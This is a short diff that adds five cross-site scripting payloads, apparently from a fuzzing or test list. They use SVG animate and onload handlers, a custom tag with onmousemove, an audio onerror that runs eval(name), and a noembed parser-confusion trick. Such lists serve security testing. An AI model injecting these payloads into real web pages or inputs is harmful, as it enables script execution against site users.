@@ -1,0 +1,5 @@
+<svg><animate onend=console.log(1) attributeName=x dur=1s>
+<svg/onload=alert`1`>
+<xss onmousemove=alert(1) style=display:block>test</xss>
+<audio/src/onerror=eval(name)>
+<noembed><img title=\"</noembed><img src onerror=alert(1)>\"></noembed>
